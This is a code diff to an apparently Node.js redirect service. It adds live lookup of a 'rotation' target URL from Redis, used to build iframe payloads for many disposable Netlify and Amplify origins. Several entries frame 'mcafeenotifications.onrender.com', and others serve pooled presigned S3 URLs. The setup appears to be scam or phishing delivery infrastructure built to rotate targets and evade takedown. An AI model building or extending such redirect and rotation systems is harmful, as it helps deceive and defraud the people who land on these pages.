@@ -27,6 +27,9 @@ const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
 const BUCKET_NAME = process.env.BUCKET_NAME;
 const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";
 
+const UPSTASH_REDIS_REST_URL   = process.env.UPSTASH_REDIS_REST_URL;
+const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
+
 const BATCH_SIZE = 3000;
 const TOPUP_THRESHOLD = 300;
 const PRESIGN_EXPIRY_SECONDS = 3600;
@@ -50,9 +53,29 @@ const s3Control = new S3ControlClient({ region: REGION });
 const redis = new Redis(process.env.REDIS_URL);
 redis.on("error", (err) => console.error("Redis error:", err.message));
 
+// ─── Rotation target helper ───────────────────────────────────────
+// Fetches the current rotating Netlify URL from Upstash REST API.
+// Falls back to the hardcoded target if Redis is unreachable or empty.
+async function getRotationTarget(key) {
+  try {
+    const res = await fetch(`${UPSTASH_REDIS_REST_URL}/get/${key}`, {
+      headers: { Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}` },
+    });
+    const data = await res.json();
+    return data.result || null;
+  } catch (err) {
+    console.error(`[rotation] Redis fetch failed (${key}):`, err.message);
+    return null;
+  }
+}
+
 // ─── Origin groups ────────────────────────────────────────────────
-// Each origin maps to { method, target }. `method` selects which
-// buildPayload handler runs (see BUILD_PAYLOAD_HANDLERS below):
+// Each origin maps to { method, target, redisKey? }.
+// If redisKey is set, the target is fetched live from Redis on every
+// request instead of using the hardcoded value. The hardcoded target
+// acts as a fallback if Redis is unreachable or the key is empty.
+//
+// `method` selects which buildPayload handler runs:
 //   - "iframe":      embed `target` in an iframe
 //   - "redirect":    window.location.replace(target)
 //   - "s3ap":        pop a unique presigned URL from the AP pool and
@@ -61,7 +84,7 @@ redis.on("error", (err) => console.error("Redis error:", err.message));
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://thriving-boba-4ed801.netlify.app" },
+    "https://cheery-douhua-d9bd03.netlify.app": { method: "iframe", target: "https://thriving-boba-4ed801.netlify.app", redisKey: "rotation:target_url" },
     "https://cozy-kheer-cea1f9.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://lambent-maamoul-1de7b2.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
     "https://nimble-bonbon-e8f851.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
@@ -71,7 +94,7 @@ const ORIGIN_GROUPS = {
     "https://relaxed-pegasus-8e3b77.netlify.app": { method: "iframes3ap", target: "https://mcafeenotifications.onrender.com" },
   },
   dmc: {
-    "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://thriving-boba-4ed801.netlify.app" },
+    "https://miyabikinjp.dqwzavw2upc3z.amplifyapp.com": { method: "iframe", target: "https://thriving-boba-4ed801.netlify.app", redisKey: "rotation:target_url" },
   },
   aomine: {
     "https://zen-hawellness.life": { method: "iframe", target: "https://mcafeenotifications.onrender.com" },
@@ -559,7 +582,14 @@ function buildPayloadRedirect(targetUrl) {
 }
 
 const BUILD_PAYLOAD_HANDLERS = {
-  iframe: async (entry) => buildPayloadIframe(entry.target),
+  iframe: async (entry) => {
+    let target = entry.target;
+    if (entry.redisKey) {
+      const dynamic = await getRotationTarget(entry.redisKey);
+      if (dynamic) target = dynamic;
+    }
+    return buildPayloadIframe(target);
+  },
   redirect: async (entry) => buildPayloadRedirect(entry.target),
   s3ap: async () => {
     const presigned = await nextPresignedUrl();
